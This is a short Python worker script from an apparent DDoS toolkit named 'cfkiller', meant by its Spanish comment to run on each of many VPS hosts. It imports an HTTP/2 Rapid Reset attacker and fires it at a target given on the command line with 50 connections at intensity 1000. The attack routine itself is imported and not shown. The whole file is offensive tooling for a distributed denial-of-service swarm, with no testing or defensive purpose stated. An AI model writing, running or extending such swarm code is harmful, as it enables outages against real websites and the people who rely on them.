# cfkiller/swarm/worker.py  (para correr en cada VPS)
import asyncio
from cfkiller.core.http2.rapid_reset import RapidResetAttacker

async def swarm_worker(target: str):
    # Use max_connections to match RapidResetAttacker signature and avoid parameter mismatch
    attacker = RapidResetAttacker(host=target, max_connections=50, intensity=1000)
    await attacker.attack()

if __name__ == "__main__":
    import sys
    asyncio.run(swarm_worker(sys.argv[1]))